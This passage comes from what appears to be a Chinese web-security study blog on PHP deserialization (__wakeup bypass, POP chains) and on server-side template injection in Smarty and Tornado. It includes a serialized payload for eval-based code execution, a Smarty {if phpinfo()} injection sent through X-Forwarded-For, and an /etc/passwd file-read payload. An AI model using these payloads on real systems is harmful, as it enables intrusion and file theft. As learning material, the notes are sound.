class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="wakeup-函数绕过漏洞原理"><a href="#wakeup-函数绕过漏洞原理" class="headerlink" title="__wakeup()函数绕过漏洞原理"></a>__wakeup()函数绕过漏洞原理</h4><h5 id="1-低版本的php"><a href="#1-低版本的php" class="headerlink" title="1.低版本的php"></a>1.低版本的php</h5><p><code>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p><code>从而绕过了__wakeup()函数</code></p>
<h6 id="2-高一些的版本"><a href="#2-高一些的版本" class="headerlink" title="2.高一些的版本"></a>2.高一些的版本</h6><p>举个例子，</p>
<p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>关键是把<code>O:</code>改成<code>C:</code>，</p>
<p><strong>原理是</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AVRASM"><figure class="iseeu highlight /avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了</span><br></pre></td></tr></table></figure></div>



<h4 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h4><p>实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些<code>魔术方法</code>的相互触发，来构造一条popchain，从反序列化接口开始，<strong>一级一级的触发</strong>【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的<code>方法/函数</code></p>
<hr>
<h4 id="个人-一些文章对-php反序列化的一些认知"><a href="#个人-一些文章对-php反序列化的一些认知" class="headerlink" title="*个人+一些文章对 php反序列化的一些认知"></a>*个人+一些文章对 php反序列化的一些认知</h4><p>举例</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>



<p>正常实例化后会执行<code>normal</code>类里面的<code>action</code>方法，但是<code>unserialize</code>函数是可控的，我们就可以对其进行攻击，思路就是改变<code>index</code>类里面<code>test</code>属性的值，让它实例化<code>evil</code>类，从而执行<code>evil</code>里面的<code>action</code>方法，同时我们也要修改<code>evil</code>类里面的<code>test2</code>属性的值</p>
<hr>
<p>因为<code>类不同于函数</code>，<code>定义完之后无法直接使用</code>，因为类<code>只是一个抽象的概念</code>，<u><strong>需要通过关键字new来实例化类，才可以使用</strong></u>。类实例化的语法格式如下：<strong>变量名=new 类名（[构造函数]）</strong>。</p>
<p>其中，变量名可以为<strong>任何PHP变量的名称</strong>，构造参数取决于<strong>类的构造函数</strong>，若<strong>无构造函数，则圆括号中为空</strong>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例化一个类后即可使用该类</span><br></pre></td></tr></table></figure>

<hr>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>



<p>这里反序化的，先是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure></div>

<p>实例化index()类，然后调动其<code>test</code>变量实例化<code>evil)()</code>，</p>
<p>使其能够被调用，然后根据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure></div>

<p>我们对<code>test2</code>变量进行赋值命令语句，使得我们可以利用其中的<code>eval</code>函数，执行一些命令来拿到我们所需要的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>最后对序列化的<strong>入口类</strong>(<code>index.php</code>)序列化，然后把序列化结果导入，再由源码中反序列化函数后，从而实现我们想要的结构</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>比如这里就是以<code>GET</code>方式传参<code>test</code>参数，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=序列化结果</span><br></pre></td></tr></table></figure></div>



<p><strong>但是序列化的结果未必都是没有问题的，因为<code>%00</code>这个空字符是无法显示，只能输入进去</strong></p>
<p>以上面为例子，序列化后结果为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果用了这个是会报错的，</p>
<p><img src="/2022/05/28/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></p>
<p>因为这里的参数有问题</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>我们仔细看一下属性值是<code>11</code>，但是后面的<code>indextest</code>总共是<code>9</code>个字符，所以丢失了两个字符，这两个字符就是空字符<code>%00</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里我们加上后再试试</p>
<p><img src="/2022/05/28/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></p>
<p>就实现了我们的目的操作</p>
<p>当然其实还可能有的情况后面不是<code>eval()</code>的命令执行，可能是文件包含，或者其他操作，按这种思路走大都是没有问题的</p>
<hr>
<h3 id="十二、ssti"><a href="#十二、ssti" class="headerlink" title="十二、ssti"></a>十二、ssti</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">参考文章</a></p>
<p>根据下图，推测不同的模板注入，然后使用不同的注入方法</p>
<p><img src="/2022/05/28/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p>
<p><img src="/2022/05/28/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/111503731">原文链接1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/219913.html">原文链接2</a></p>
<p><u><strong>注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用<code>&#123; &#123; &#125; &#125;</code>或<code>&#123; ％ ％ &#125;</code>包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。</strong></u></p>
<p><u><strong>这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客</strong></u></p>
<h4 id="关于基于flask的SSTI漏洞的阶段学习小结："><a href="#关于基于flask的SSTI漏洞的阶段学习小结：" class="headerlink" title="关于基于flask的SSTI漏洞的阶段学习小结："></a>关于基于flask的SSTI漏洞的阶段学习小结：</h4><h5 id="SSTI的理解："><a href="#SSTI的理解：" class="headerlink" title="SSTI的理解："></a>SSTI的理解：</h5><p>SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。</p>
<h5 id="SSTI引发的真正原因："><a href="#SSTI引发的真正原因：" class="headerlink" title="SSTI引发的真正原因："></a>SSTI引发的真正原因：</h5><p>render_template渲染函数的问题</p>
<h5 id="render-template渲染函数是什么："><a href="#render-template渲染函数是什么：" class="headerlink" title="render_template渲染函数是什么："></a>render_template渲染函数是什么：</h5><p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h5 id="render-template："><a href="#render-template：" class="headerlink" title="render_template："></a>render_template：</h5><p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，<br>即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }<br>真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞<br>注入的思想：</p>
<p>用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
<h4 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h4><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h5 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h5><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h5 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h5><h6 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{/php}标签"></a>{php}{/php}标签</h6><p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p>
<p>在Smarty3的官方手册里有以下描述:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Smarty</span>已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty <span class="number">3</span>.<span class="number">1</span>，&#123;php&#125;仅在SmartyBC中可用。</span><br></pre></td></tr></table></figure></div>

<p>该题目使用的是Smarty类，所以只能另寻它路。</p>
<h6 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h6><p>官方手册这样描述这个标签：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;literal&#125;</span><span class="language-xml">可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span></span><br></pre></td></tr></table></figure></div>

<p>那么对于php5的环境我们就可以使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h5 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h5><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:///etc/passwd”)}。然而使用这个payload会触发报错如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  is undefined or not allowed by security setting &lt;-- thrown in  <span class="regexp">/var/</span>www<span class="regexp">/html/</span>smarty<span class="regexp">/libs/</span>sysplugins/smarty_internal_templatecompilerbase.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h6 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h6><p>官方文档中看到这样的描述：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Smarty的</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">条件判断和PHP的if 非常相似，只是增加了一些特性。每个</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">必须有一个配对的</span><span class="template-tag">&#123;/<span class="name">if</span>&#125;</span><span class="language-xml">. 也可以使用</span><span class="template-variable">&#123;else&#125;</span><span class="language-xml"> 和 </span><span class="template-variable">&#123;elseif&#125;</span><span class="language-xml">. </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">全部的PHP条件表达式和函数都可以在if内使用，</span></span><br><span class="line"><span class="language-xml">如*||*, or, &amp;&amp;, and, is_array(), 等等</span></span><br></pre></td></tr></table></figure></div>

<p>既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>将XFF头改为{if phpinfo()}{/if}，可以看到题目执行了phpinfo()</p>
<p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p>
<p>用同样的方法可以轻松获得flag</p>
<p>题目漏洞代码</p>
<p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h4 id="Tornado-SSTI利用"><a href="#Tornado-SSTI利用" class="headerlink" title="Tornado SSTI利用"></a>Tornado SSTI利用</h4><p><strong>tornado是用Python编写的Web服务器兼Web应用框架</strong>，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"> Tornado模板支持控制语句和表达式。</span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">控制语句被</span><span class="template-tag">&#123;% %&#125;</span><span class="language-xml">, e.g. </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> len(items) &gt; 2 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">表达式被</span><span class="template-variable">&#123;&#123; &#125;&#125;</span><span class="language-xml">, e.g. </span><span class="template-variable">&#123;&#123; items[0] &#125;&#125;</span><span class="language-xml">.</span></span><br></pre></td></tr></table></figure></div>

<p><strong>render()<strong>是tornado里的函数，</strong>可以生成html模板。是一个渲染函数</strong>，就是一个公式，<strong>能输出前端页面的公式。</strong></p>
<p><strong>Tornado</strong>框架的附属文件<strong>handler.settings</strong>中存在<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>这个对象，<u>Handler指向的处理当前这个页面的RequestHandler对象</u></p>
<pre><code>RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性

handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings

所有handler.settings就指向RequestHandler.application.settings了！
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/2022/05/31/daily/" rel="next" title="WEB学习笔记">
      WEB学习笔记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>


  <aside class="sidebar">
    <div class="sidebar-inner">
	  

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Web安全学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89%E3%80%90%E5%8E%9F%E7%90%86-%E5%8D%B1%E5%AE%B3-%E9%98%B2%E5%BE%A1-%E5%88%A9%E7%94%A8%E3%80%91"><span class="nav-number">1.1.</span> <span class="nav-text">基础漏洞知识（一）【原理+危害+防御+利用】</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.1.</span> <span class="nav-text">Sql漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-sql%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">1.sql漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.2.</span> <span class="nav-text">XSS漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1.XSS漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-1"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.3.</span> <span 